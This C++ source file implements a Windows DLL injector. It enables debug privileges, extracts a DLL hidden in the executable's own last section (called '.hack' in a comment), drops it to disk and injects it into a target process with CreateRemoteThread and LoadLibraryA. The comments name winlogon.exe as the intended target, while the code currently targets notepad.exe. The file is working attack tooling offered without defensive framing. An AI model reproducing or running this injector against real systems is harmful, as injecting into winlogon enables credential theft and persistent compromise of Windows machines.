#include "includes.h"

// Getting Debug privileges for injecting into winlogon.exe
void Helper::GetDebugPrivs()
{
	HANDLE hToken;
	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
	LUID sedebugnameValue;
	LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &sedebugnameValue);
	TOKEN_PRIVILEGES tp;
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = sedebugnameValue;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
	CloseHandle(hToken);
}

// Geting winlogoninject.exe Imagebase address
PVOID Helper::GetImageBase()
{
	// Thread Environment Block
	struct _TEB* TEB = NtCurrentTeb();

	// Process Environment Block (TEB + 0x60) -> ImageBaseAddress (PEB + 0x10)
	PVOID imagebase = (PVOID)TEB->ProcessEnvironmentBlock->Reserved3[1];
	return imagebase;
}

// Extracting dll memory from winlogoninject.exe section .hack (:
PBYTE Helper::GetDllVirtualAddress(PBYTE module_base, PDWORD module_size)
{
	PIMAGE_DOS_HEADER image_dos_header = (PIMAGE_DOS_HEADER)(module_base);
	if (image_dos_header->e_magic == IMAGE_DOS_SIGNATURE) {
		PIMAGE_NT_HEADERS image_nt_headers = (PIMAGE_NT_HEADERS)(module_base + image_dos_header->e_lfanew);
		if (image_nt_headers->Signature == IMAGE_NT_SIGNATURE) {

			// Getting first section
			PIMAGE_SECTION_HEADER first_section = (PIMAGE_SECTION_HEADER)(IMAGE_FIRST_SECTION(image_nt_headers));

			// Getting last section
			PIMAGE_SECTION_HEADER dll_section = (PIMAGE_SECTION_HEADER)(first_section + image_nt_headers->FileHeader.NumberOfSections - 1);

			if (dll_section != ERROR)
			{
				*module_size = dll_section->Misc.VirtualSize;

				// Returning dll virtual address 
				PBYTE dllVirtualAddress = (PBYTE)((PBYTE)module_base+(DWORD)dll_section->VirtualAddress);
				return dllVirtualAddress;
			}
		}

	}
	return 0;
}

// Creating dll file
DWORD Helper::CreateDllFile(char dllPath[MAX_PATH]) {
	PBYTE module_base = (PBYTE)GetImageBase();
	if (module_base != ERROR)
	{
		DWORD module_size = NULL;
		PBYTE dllVirtualAddress = Helper::GetDllVirtualAddress(module_base, &module_size);
		if (dllVirtualAddress != ERROR) {
			DWORD bytes_written = NULL;
			HANDLE new_file = CreateFileA(dllPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
			if (new_file != INVALID_HANDLE_VALUE)
			{
				WriteFile(new_file, dllVirtualAddress, module_size, &bytes_written, NULL);
				CloseHandle(new_file);
				return 1;
			}
			else {
				CloseHandle(new_file);
				return 0;
			}
		}
	}
	return 0;
}

// Finding winlogon.exe process Id
DWORD Helper::FindPID()
{
	// Process name to inject (can be change)
	const TCHAR processName[] = L"notepad.exe";

	// Taking a snapshot of all processes in the system 
	HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (hSnapShot != INVALID_HANDLE_VALUE) {
		PROCESSENTRY32 pEntry;
		pEntry.dwSize = sizeof(PROCESSENTRY32);
		if (Process32First(hSnapShot, &pEntry))
			// Iterating over all processes in the system (Snapshot)
			do {
				// Check if szExeFile(name) == processName(winlogon.exe)
				if (wcscmp(processName, pEntry.szExeFile) == 0) {
					CloseHandle(hSnapShot);
					// Return winlogon.exe process Id 
					return pEntry.th32ProcessID;
				}
			} while (Process32Next(hSnapShot, &pEntry));
			CloseHandle(hSnapShot);
	}
	return 0;
}

// Executing dll injection to winlogon.exe process
void Helper::InjectDll(HANDLE hProcess, char dllPath[])
{
	int dllPathSize = strlen(dllPath) + 1;
	void* pMemory = VirtualAllocEx(hProcess, NULL, dllPathSize, MEM_COMMIT, PAGE_READWRITE);
	WriteProcessMemory(hProcess, pMemory, (void*)dllPath, dllPathSize, NULL);
	LPVOID dllRoutineAdress = (LPVOID)GetProcAddress(GetModuleHandle(TEXT("kernel32")), "LoadLibraryA");
	HANDLE  hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)dllRoutineAdress, pMemory, 0, NULL);
	CloseHandle(hThread);
	VirtualFreeEx(hProcess, pMemory, dllPathSize, MEM_RELEASE);
}

